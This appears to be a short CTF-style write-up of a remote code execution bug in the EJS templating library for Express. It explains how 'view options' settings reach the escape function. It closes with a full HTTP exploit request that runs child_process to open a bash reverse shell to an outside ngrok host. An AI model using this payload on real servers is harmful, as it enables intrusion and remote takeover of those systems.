# express javascript security
## RCE in templating library

On reading through the source code of ejs,we can see that there is a particular code block like this

```js
viewOpts = data.settings['view options'];
if (viewOpts) {
    utils.shallowCopy(opts, viewOpts);
}
```
ie, whatever that is in view options gets passed to opts, also we see this particular line while going through the source code

```js
var escapeFn = opts.escapeFunction;
```
So the escape function from opts is getting passed to escapeFn, but here 'escapeFunction' function is blocked we can use the following line to bypass it
```js
  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
```
we can just pass in our payload to escape rather than escapeFunction and it would still work.

```js
if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
}
```
and it's been passed on to src, which will then be rendered, So a payload like this would work.

So the final exploit is as follows

```bash
GET /greet?name=x&settings[view options][escape]=JSON.stringify;process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/8.tcp.ngrok.io/16180 0>&1"')&settings[view options][client]=1&font=x&fontSize=x HTTP/1.1
```

